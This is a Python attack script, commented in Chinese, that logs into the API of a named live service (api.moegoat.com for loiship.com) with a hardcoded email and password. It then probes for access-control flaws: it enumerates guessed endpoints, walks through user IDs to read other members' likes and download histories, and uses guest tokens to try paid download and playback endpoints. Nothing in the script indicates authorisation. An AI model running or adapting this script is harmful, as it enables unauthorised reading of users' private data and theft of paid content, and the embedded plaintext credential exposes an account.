# -*- coding: utf-8 -*-
"""activity 接口枚举 + IDOR 深挖: mydownloaded/mylikes/history 越权读会员用户"""

import urllib.request, urllib.parse, json, time, sys, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:250]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
mode = sys.argv[2] if len(sys.argv) > 2 else "idor"
res = []

st, body = req(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
log("login: %s" % st)
time.sleep(1)

if mode == "activity":
    log("=== activity 接口枚举 ===")
    act_tests = [
        ("POST", "/api/user/activity/sync", {"events": [], "key_id": 1}, H),
        ("GET", "/api/user/activity/sync", None, H),
        ("GET", "/api/user/activity/list", None, H),
        ("GET", "/api/user/activity", None, H),
        ("GET", "/api/user/activity/claim", None, H),
        ("GET", "/api/user/activity/reward", None, H),
        ("GET", "/api/user/activity/checkin", None, H),
        ("GET", "/api/user/activity/tasks", None, H),
        ("GET", "/api/user/activity/status", None, H),
        ("GET", "/api/activity/list", None, H),
        ("GET", "/api/activity", None, H),
        ("POST", "/api/user/activity/sync?user_id=1", {"events": []}, H),
    ]
    for method, path, data, hdrs in act_tests:
        st, b = req(method, path, data, hdrs)
        res.append({"t": "act-" + path, "s": st, "b": b[:300]})
        log("act %s: %s %s" % (path[:45], st, b[:120].replace("\n", " ")))
        time.sleep(0.4)

elif mode == "idor":
    log("=== IDOR: 枚举会员用户 ===")
    # user/info 参数变体
    for pname in ["user_id", "uid", "id", "userId", "member_id"]:
        st, b = req("GET", "/api/user/info?%s=1" % pname, headers=H)
        res.append({"t": "info-%s" % pname, "s": st, "b": b[:300]})
        log("info?%s=1: %s %s" % (pname, st, b[:130].replace("\n", " ")))
        time.sleep(0.3)
    # mylikes 枚举(找有数据的用户)
    for uid in range(100, 2600, 40):
        st, b = req("GET", "/api/user/mylikes?user_id=%d&page=1" % uid, headers=H)
        res.append({"t": "ml-%d" % uid, "s": st, "b": b[:300]})
        if st == 200:
            try:
                data = json.loads(b).get("data") or []
                if data:
                    log(
                        ">>> mylikes user_id=%d 有 %d 条! %s"
                        % (uid, len(data), b[:250].replace("\n", " "))
                    )
                else:
                    log("mylikes user_id=%d: 200 空" % uid)
            except Exception:
                log("mylikes user_id=%d: %s" % (uid, b[:100]))
        time.sleep(0.3)
        if st == 403:
            break
    # mydownloaded 枚举(找有下载的会员)
    for uid in range(100, 1600, 40):
        st, b = req("GET", "/api/user/mydownloaded?user_id=%d&page=1" % uid, headers=H)
        res.append({"t": "mdl-%d" % uid, "s": st, "b": b[:300]})
        if st == 200:
            try:
                data = json.loads(b).get("data") or []
                if data:
                    log(
                        ">>> mydownloaded user_id=%d 有 %d 条! %s"
                        % (uid, len(data), b[:300].replace("\n", " "))
                    )
                else:
                    log("mydownloaded user_id=%d: 200 空" % uid)
            except Exception:
                log("mydownloaded user_id=%d: %s" % (uid, b[:100]))
        time.sleep(0.3)
        if st == 403:
            break
    # 其他参数名变体
    for pname in ["user_id", "uid", "id", "user", "member_id", "userId"]:
        st, b = req("GET", "/api/user/mydownloaded?%s=1&page=1" % pname, headers=H)
        res.append({"t": "mdl-%s" % pname, "s": st, "b": b[:300]})
        log("mydownloaded?%s=1: %s %s" % (pname, st, b[:120].replace("\n", " ")))
        time.sleep(0.3)

elif mode == "guest":
    log("=== 游客身份测试 ===")
    st, b = req("POST", "/api/user/guest-signup")
    gt = ""
    try:
        gj = json.loads(b)
        gt = (gj.get("access_token") or "").replace("bearer ", "")
    except Exception:
        pass
    log("guest-signup: %s %s" % (st, b[:100]))
    if gt:
        GH = {"Authorization": "Bearer " + gt}
        for ep in [
            "mydownloaded",
            "mylikes",
            "history",
            "notifications",
            "subscribed/list",
        ]:
            st, b = req("GET", "/api/user/%s" % ep, headers=GH)
            res.append({"t": "guest-" + ep, "s": st, "b": b[:300]})
            log("guest %s: %s %s" % (ep, st, b[:120].replace("\n", " ")))
            time.sleep(0.3)
        # 游客 download/play
        st, b = req("GET", "/api/user/loi/download_v6/6422", headers=GH)
        res.append({"t": "guest-dl", "s": st, "b": b[:300]})
        log("guest download_v6: %s %s" % (st, b[:150]))
        st, b = req("GET", "/api/user/loi/online_play_v2/6422", headers=GH)
        res.append({"t": "guest-op", "s": st, "b": b[:300]})
        log("guest online_play_v2: %s %s" % (st, b[:150]))

with open("act_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("act_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("%s shard%d done" % (mode, shard))
